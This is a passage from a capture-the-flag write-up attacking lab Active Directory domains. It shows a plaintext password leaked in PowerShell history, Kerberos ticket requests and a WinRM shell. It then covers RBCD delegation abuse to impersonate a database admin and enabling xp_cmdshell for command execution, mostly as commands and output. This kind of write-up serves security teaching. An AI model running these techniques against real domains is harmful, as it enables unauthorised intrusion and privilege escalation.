¦       ITAccess.psrc
¦       JEAconfig_backup.pssc
¦       
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

Together the files define a second, more privileged JEA endpoint, which is likely registered on at least one of the two DCs. `JEAconfig_backup.pssc` is the session configuration:

```powershell
@{

# Version number of the schema used for this document
SchemaVersion = '2.0.0.0'

# ID used to uniquely identify this document
GUID = '54906d16-7873-47d3-81f1-fc8d29748ecf'

# Author of this document
 = 'Pong\C.Carlssen'

# Description of the functionality provided by these settings
# Description = ''

# Session type defaults to apply for this session configuration. Can be 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'
SessionType = 'RestrictedRemoteServer'

# Directory to place session transcripts for this session configuration
TranscriptDirectory = 'C:\ProgramData\JEAConfiguration\Transcripts'

# Whether to run this session configuration as the machine's (virtual) administrator account
RunAsVirtualAccount = $true

# User roles (security groups), and the role capabilities that should be applied to them when applied to a session
RoleDefinitions = @{
    'Author = 'Pong\C.Carlssen' = @{
        'RoleCapabilities' = 'ITAccess' } }
}
```

This file has the following:

-   `RunAsVirtualAccount = $true` - Commands in this endpoint run as a temporary virtual account, not as the person who connects. On a DC, that’s effectively domain admin.
-   `RoleDefinitions` - This is actually mangled with misquotes. `'Author = '` completes the string. So this file wouldn’t load as written. Still, it makes clear that Pong\\C.Carlssen is the intended user for this configuration.
-   `TranscriptDirectory` - Defines where sessions connected to this endpoint will store transcripts.
-   `SessionType = 'RestrictedRemoteServer'` - This endpoint defaults to NoLanguage, so the `&{ }` trick that worked on `restricted` won’t work here.

`ITAccess.psrc` shows what the users on this endpoint can run:

```powershell
@{
    # Metadata
    GUID = 'b6f3b4e1-9a2e-4c0a-9c8e-0e1b5a9f1234'
     = 'Administrator'
    CompanyName = 'Ping.htb'

    VisibleCmdlets = @(
        # Services
        'Get-Service',
        'Restart-Service',

        # Event logs
        'Get-EventLog',

        # History
        'Get-History',

        # Networking
        'Get-NetIPConfiguration',
        'Get-NetIPAddress',
        'Get-NetRoute',
        'Test-Connection',
        'Resolve-DnsName'
    )

    VisibleAliases = @(
        @{
            Name        = 'history'
            Definition  = 'Get-History'
        }
    )

    VisibleExternalCommands = @(
        'ipconfig.exe',
        'ping.exe',
        'tracert.exe',
        'nslookup.exe'
    )

    VisibleProviders = @(
        'FileSystem'
    )

    CommandDefinitions = @(
        @{
            Name = 'Restart-Service'
            Parameters = @{
                Name = @{
                    ValidateSet = 'Spooler', 'W32Time'
                }
            }
        }
    )

    LanguageMode = 'NoLanguage'

    ModulesToImport = @(
        'Microsoft.PowerShell.Management',
        'NetTCPIP'
    )
}
```

Pong_gMSA$ also has a PowerShell history file at `C:\Users\Pong_gMSA$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`:

```powershell
ls
ls -force
hostname
whoami
whoami /all
Get-ExecutionPolicy
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
Get-Help Get-Process
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
gci
gci C:\
Getchilditem \Windows
Set-Location C:\Users\
ls
cd.\Public
ls
cd C:\
gic -Recurse -ErrorAction SilentlyContinue
gci -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Filter *.log
Get-ChildItem -Recurse -Include *.txt
Clear-Host
Get-Command
Get-Command *service*
Get-Command *process*
Get-CimInstance Win32_OperatingSystem
Get-CimInstance Win32_ComputerSystem
Get-CimInstance Win32_Process
Get-CimInstance Win32_LogicalDisk
Get-CimInstance Win32_BIOS
Get-Alias
Get-History
ipconfig
ipconfig /all
ping google.com
netstat -ano
Test-NetConnection google.com
Test-NetConnection google.com -Port 443
Get-DnsClientServerAddress
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 8.8.8.8
tasklist
tasklist /v
ls
ls -force
Get-Process explorer
Get-EventLog -LogName System -Newest 20
Get-EventLog -LogName Application -Newest 20
Get-WinEvent -LogName Security -MaxEvents 10
Clear-EventLog -LogName Application
$env:Path
Get-PSDrive
Get-PSProvider
Get-
Get-Module -ListAvailable
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter *
Get-ADUser -Identity Administrator
Get-ADGroup -Filter * -Server pong.htb
Getadgroup
Get-adgroup "remote management users" -server pong.htb
$c = New-object System.management.automation.pscredential("pong\c.carlssen,$(convertto-securestring -asplaintext -force "A()DUJ!@414"))
Enter-pssession -computername dc2.pong.htb -credential $c
Get-ADComputer -Filter *
Get-ADUser -Filter * | Select-Object Name
Get-ADUser -Filter * | Export-Csv users.csv -NoTypeInformation
Import-Csv users.csv
gc -raw users.csv
cd C:\Temp
Copy-Item users.csv backup_users.csv
Move-Item backup_users.csv archive_users.csv
rm -f *.csv
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"
Restart-Service spooler
Stop-Service spooler
Start-Service spooler
Set-Service spooler -StartupType Automatic
Get-Service spooler
Get-Process powershell
Get-Process pwsh
$PSVersionTable
Get-Host
Clear-History
Get-History
Measure-Command { Get-Process }
ForEach ($i in 1..10) { Write-Output $i }
1..10 | ForEach-Object { $_ * 2 }
1..10 | Where-Object { $_ -gt 5 }
$numbers = 1..100
$numbers | Measure-Object -Sum
$numbers | Measure-Object -Average
$numbers | Sort-Object -Descending
$numbers | Select-Object -First 10
Get-ChildItem HKLM:\Software
Get-ChildItem HKCU:\Software
Get-Command -Module Microsoft.PowerShell.Management
Save-Help -DestinationPath C:\Help
Get-PSReadLineOption
Set-PSReadLineOption -PredictionSource History
Clear-Host
iwr -useb https://github.com/fleschutz/PowerShell/blob/main/scripts/play-mission-impossible.ps1

Exit
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

The interesting lines are:

```powershell
$c = New-object System.management.automation.pscredential("pong\c.carlssen,$(convertto-securestring -asplaintext -force "A()DUJ!@414"))
Enter-pssession -computername dc2.pong.htb -credential $c
```

The quoting in the first line is off, so it wouldn’t have run as written, but the password is there.

c.carlssen is a member of the Remote Management Users group on `pong.htb`:

![BloodHound showing c.carlssen as a member of the IT Service Admins and Remote Management Users groups on pong.htb](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f941b8bce5d4ff48.png)

![BloodHound showing c.carlssen as a member of the IT Service Admins and Remote Management Users groups on pong.htb](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-f941b8bce5d4.webp)

### Shell

#### Auth

I’ll get a TGT as c.carlssen:

```css
oxdf@hacky$ proxychains getTGT.py 'pong.htb/c.carlssen:A()DUJ!@414'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[*] Saving ticket in c.carlssen.ccache
```

I can use that to auth on `DC1.ping.htb`:

```css
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains netexec smb dc1.ping.htb --use-kcache
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:135  ...  OK
SMB         dc1.ping.htb    445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PING.HTB:88  ...  OK
SMB         dc1.ping.htb    445    dc1              [+] PONG.HTB\c.carlssen from ccache 
```

Interesting that it first hits Kerberos on `pong.htb` and then on `ping.htb`. That’s a cross-realm referral, which I’ll look at more closely [later](#auth-as-rmartinelli). If I ran without `proxychains` it would hang trying to reach `DC2.pong.htb`. I can auth on `DC2.pong.htb` as well:

```css
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains netexec smb dc2.pong.htb --use-kcache
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:135  ...  OK
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
SMB         dc2.pong.htb    445    dc2              [+] PONG.HTB\c.carlssen from ccache 
```

#### Evil-WinRM-Py

I’ll use the TGT and `proxychains` to get a shell on `DC2`:

```css
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains evil-winrm-py -i dc2.pong.htb -k
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to 'dc2.pong.htb:5985' as 'c.carlssen@PONG.HTB'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:5985  ...  OK
evil-winrm-py PS C:\Users\C.Carlssen\Documents>
```

And grab `user.txt`:

```
evil-winrm-py PS C:\Users\C.Carlssen\Desktop> cat user.txt
e044347a************************
```

## Full PONG.HTB Compromise

### Enumeration

#### DC2 Filesystem

c.carlssen’s home directory is pretty empty:

```sql
evil-winrm-py PS C:\Users\C.Carlssen> tree /f .
Folder PATH listing
Volume serial number is 0000019C A092:63D8
C:\USERS\C.CARLSSEN
+---Desktop
¦       user.txt
¦       
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

Nothing interesting at the root of the drive either:

```sql
evil-winrm-py PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/20/2026   1:25 PM                inetpub
d-----          5/8/2021   1:15 AM                PerfLogs
d-r---         1/16/2026   6:40 AM                Program Files
d-----         1/16/2026   6:39 AM                Program Files (x86)
d-r---          2/5/2026   5:40 AM                Users
d-----         4/21/2026   1:07 PM                Windows
```

#### MSSQL

I’ll look at what services are listening on DC2:

```yaml
evil-winrm-py PS C:\> netstat -ano | findstr LISTEN
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       720
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1704
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       356
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49679          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:55457          0.0.0.0:0              LISTENING       1840
  TCP    0.0.0.0:55495          0.0.0.0:0              LISTENING       1348
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       1840
  TCP    192.168.2.2:53         0.0.0.0:0              LISTENING       1840
  TCP    192.168.2.2:139        0.0.0.0:0              LISTENING       4
  TCP    [::]:88                [::]:0                 LISTENING       636
  TCP    [::]:135               [::]:0                 LISTENING       904
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       636
  TCP    [::]:593               [::]:0                 LISTENING       904
  TCP    [::]:1433              [::]:0                 LISTENING       720
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       1704
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       636
  TCP    [::]:49665             [::]:0                 LISTENING       512
  TCP    [::]:49666             [::]:0                 LISTENING       356
  TCP    [::]:49667             [::]:0                 LISTENING       696
  TCP    [::]:49668             [::]:0                 LISTENING       636
  TCP    [::]:49674             [::]:0                 LISTENING       636
  TCP    [::]:49679             [::]:0                 LISTENING       624
  TCP    [::]:49686             [::]:0                 LISTENING       636
  TCP    [::]:55457             [::]:0                 LISTENING       1840
  TCP    [::]:55495             [::]:0                 LISTENING       1348
  TCP    [::1]:53               [::]:0                 LISTENING       1840
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

1433 jumps out as interesting.

#### BloodHound

c.carlssen has outbound control because of their membership in the IT Service Admins group:

![BloodHound showing c.carlssen in IT Service Admins, which has GenericWrite over svc\_ldap, svc\_print, and svc\_sql](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3ee4f00b6c744145.png)

![BloodHound showing c.carlssen in IT Service Admins, which has GenericWrite over svc\_ldap, svc\_print, and svc\_sql](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-3ee4f00b6c74.webp)

They have `GenericWrite` over three service accounts.

### Auth to MSSQL as c.carlssen

#### Crowded Cache Issues

I’ll try to get a connection on MSSQL as c.carlssen. My initial attempt fails:

```swift
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains mssqlclient.py -no-pass -k -windows-auth dc2.pong.htb -debug
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:1433  ...  OK                                            
[*] Encryption required, switching to TLS         
[+] Using Kerberos Cache: c.carlssen.ccache                  
[+] Domain retrieved from CCache: PONG.HTB
[+] SPN MSSQLSVC/DC2.PONG.HTB:1433@PONG.HTB not found in cache
[+] AnySPN is True, looking for another suitable SPN               
[+] Returning cached credential for HTTP/DC2.PONG.HTB@PONG.HTB
[+] Using TGS from cache
[+] Changing sname from http/dc2.pong.htb@PONG.HTB to MSSQLSVC/DC2.PONG.HTB:1433@PONG.HTB and hoping for the best
[+] Username retrieved from CCache: c.carlssen
[+] Computed tls-unique CBT token: 84f760fb477677510404ad7083852aa4 
[-] ERROR(DC2): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
```

It’s trying to use `HTTP/DC2.PONG.HTB@PONG.HTB`:

```
[+] Changing sname from http/dc2.pong.htb@PONG.HTB to MSSQLSVC/DC2.PONG.HTB:1433@PONG.HTB and hoping for the best
```

That ticket was cached from my earlier WinRM session to DC2. It’s encrypted with DC2$’s key, not the key of the account MSSQL runs as, so MSSQL can’t validate it and rejects the login. I can see that ST in the cache:

```swift
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache klist
Ticket cache: FILE:c.carlssen.ccache
Default principal: c.carlssen@PONG.HTB

Valid starting       Expires              Service principal
11/16/2026 03:22:11  11/16/2026 13:22:11  krbtgt/PONG.HTB@PONG.HTB
        renew until 11/17/2026 03:22:07
11/16/2026 03:28:52  11/16/2026 13:22:11  http/dc2.pong.htb@PONG.HTB                                        
        renew until 11/17/2026 03:22:07
11/16/2026 03:54:37  11/16/2026 13:22:11  krbtgt/PING.HTB@PONG.HTB
        renew until 11/17/2026 03:22:07
11/16/2026 03:54:37  11/16/2026 13:22:11  http/dc1.ping.htb@PING.HTB
        renew until 11/17/2026 03:22:07   
```

I’ll remove the file and reacquire a TGT:

```css
oxdf@hacky$ rm c.carlssen.ccache 
oxdf@hacky$ proxychains getTGT.py 'pong.htb/c.carlssen:A()DUJ!@414'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[*] Saving ticket in c.carlssen.ccache
```

Now it’s just the TGT:

```swift
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache klist
Ticket cache: FILE:c.carlssen.ccache
Default principal: c.carlssen@PONG.HTB

Valid starting       Expires              Service principal
11/16/2026 04:42:31  11/16/2026 14:42:31  krbtgt/PONG.HTB@PONG.HTB
        renew until 11/17/2026 04:42:27
```

#### SPN Issues

This time it uses the TGT to auth, but there’s a different error:

```swift
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains mssqlclient.py -no-pass -k -windows-auth dc2.pong.htb -debug
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:1433  ...  OK
[*] Encryption required, switching to TLS
[+] Using Kerberos Cache: c.carlssen.ccache
[+] Domain retrieved from CCache: PONG.HTB
[+] SPN MSSQLSVC/DC2.PONG.HTB:1433@PONG.HTB not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/PONG.HTB@PONG.HTB
[+] Using TGT from cache
[+] Username retrieved from CCache: c.carlssen
[+] Searching target's instances to look for port number 1433
[+] Trying to connect to KDC at PONG.HTB:88
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[+] Server time (UTC): 2026-11-16 04:43:44
[+] Exception:
Traceback (most recent call last):
  File "/home/oxdf/.local/bin/mssqlclient.py", line 97, in <module>
    res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey,
                               kdcHost=options.dc_ip)
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/tds.py", line 1731, in kerberosLogin
    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                                             ~~~~~~~~~~~~~~^
        serverName, domain, kdcHost, tgt, cipher, sessionKey
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/krb5/kerberosv5.py", line 456, in getKerberosTGS
    r = sendReceive(message, domain, kdcHost)
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

The TGT is now being used, and the KDC is answering the request for `MSSQLSvc/DC2.PONG.HTB:1433` with `KDC_ERR_S_PRINCIPAL_UNKNOWN`. That means no account in `PONG.HTB` has that SPN registered, so the KDC can’t issue a ticket for it.

Impacket builds the SPN as `MSSQLSvc/<hostname>:<port>`, so it only works if the registered SPN matches exactly. There are three possibilities:

1.  The SPN exists in a different form, such as `MSSQLSvc/dc2.pong.htb` without the port or `MSSQLSvc/dc2:1433`.
2.  No MSSQL SPN is registered at all. This happens when SQL Server tries to register its SPN at startup, and its service account doesn’t have permission, so it silently doesn’t. Windows clients then quietly fall back to NTLM (which is why admins rarely notice).
3.  It’s registered in the other domain or under an unexpected host. Unlikely, but the search below would show it.

#### Connect Using the Registered SPN

I can look up the SPN for MSSQL using `bloodyAD`:

```css
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains bloodyAD -k --host dc2.pong.htb -d pong.htb get search --filter '(servicePrincipalName=MSSQLSvc*)' --attr sAMAccountName,servicePrincipalName
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:88  ...  OK

distinguishedName: CN=svc_sql,OU=Service Accounts,DC=pong,DC=htb
sAMAccountName: svc_sql
servicePrincipalName: mssqlsvc/dc2.pong.htb
```

The account associated with the SPN is svc_sql, and the SPN is `mssqlsvc/dc2.pong.htb`. I can request a service ticket for that specific SPN:

```swift
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains getST.py -k -no-pass -spn 'mssqlsvc/dc2.pong.htb' pong.htb/c.carlssen
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[*] Saving ticket in c.carlssen@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache
```

Now I can auth with that. `mssqlclient` uses the same AnySPN rewrite as before, but this time the ticket is encrypted for the right account:

```sql
oxdf@hacky$ KRB5CCNAME=c.carlssen@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache proxychains mssqlclient.py -no-pass -k -windows-auth dc2.pong.htb 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC2): Line 1: Changed database context to 'master'.
[*] INFO(DC2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (pong\C.Carlssen  guest@master)> 
```

I’ve got access to MSSQL as c.carlssen. This user is a guest in the DB. There’s nothing of interest here.

### dbo Access to MSSQL

#### Strategy

I’ve observed that c.carlssen has `GenericWrite` over the account that MSSQL is running in the context of, svc_sql. I’ll use that to configure RBCD onto the svc_sql account, allowing Pong_gMSA$ to impersonate any user to services running as svc_sql, such as MSSQL. Then I can get a connection to MSSQL as one of the database administrator accounts:

![BloodHound showing p.reiner and c.adam as members of the Database Admins group on pong.htb](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/01b983a97b65539c.png)

![BloodHound showing p.reiner and c.adam as members of the Database Admins group on pong.htb](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-01b983a97b65.webp)

I’m using the Pong_gMSA$ account because the RBCD / S4U2Proxy abuse requires the account I impersonate through to behave as a service, and c.carlssen can’t. c.carlssen is a plain user with no SPN, so the S4U2Self step fails with `KDC_ERR_S_PRINCIPAL_UNKNOWN`. The KDC won’t issue a user a service ticket to itself when it isn’t a service. Even where S4U2Self does succeed for a user, the ticket comes back non-forwardable, which then breaks S4U2Proxy. Pong_gMSA$, on the other hand, is a machine-class (service) account, so it can drive S4U cleanly.

#### Access

I’ll use `bloodyAD` to write the RBCD into place:

```css
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains bloodyAD -k --host dc2.pong.htb -d pong.htb add rbcd svc_sql Pong_gMSA$
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:88  ...  OK
[+] Pong_gMSA$ can now impersonate users on svc_sql via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+ccache://pong.htb\None:c.carlssen.ccache@dc2.pong.htb/?serverip=224.0.0.1&dc=224.0.0.1' 'HOST/svc_sql@pong.htb' 'Administrator@pong.htb'
```

Now I’ll request a service ticket for one of the database administrators:

```swift
oxdf@hacky$ KRB5CCNAME=Pong_gMSA\$.ccache proxychains getST.py -k -no-pass pong.htb/Pong_gMSA$ -impersonate p.reiner -spn mssqlsvc/dc2.pong.htb
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating p.reiner
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  pong.htb:88  ...  OK
[*] Requesting S4U2Proxy
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  pong.htb:88  ...  OK
[*] Saving ticket in p.reiner@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache
```

That ticket connects to MSSQL as dbo:

```sql
oxdf@hacky$ KRB5CCNAME=p.reiner@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache proxychains mssqlclient.py -no-pass -k -windows-auth dc2.pong.htb 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC2): Line 1: Changed database context to 'master'.
[*] INFO(DC2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (pong\P.Reiner  dbo@master)> 
```

### Potato

#### Command Execution

There’s nothing interesting in the database, but p.reiner is a sysadmin (which is why `mssqlclient` shows `dbo`), so I can enable and use `xp_cmdshell`:

```sql
SQL (pong\P.Reiner  dbo@master)> xp_cmdshell whoami
ERROR(DC2): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (pong\P.Reiner  dbo@master)> enable_xp_cmdshell
INFO(DC2): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC2): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (pong\P.Reiner  dbo@master)> xp_cmdshell whoami
output         
------------   
pong\svc_sql   
NULL 
```

The shell runs as svc_sql. It also has `SeImpersonatePrivilege`:

```sql
SQL (pong\P.Reiner  dbo@master)> xp_cmdshell "whoami /priv"
output
--------------------------------------------------------------------------------   
NULL
PRIVILEGES INFORMATION
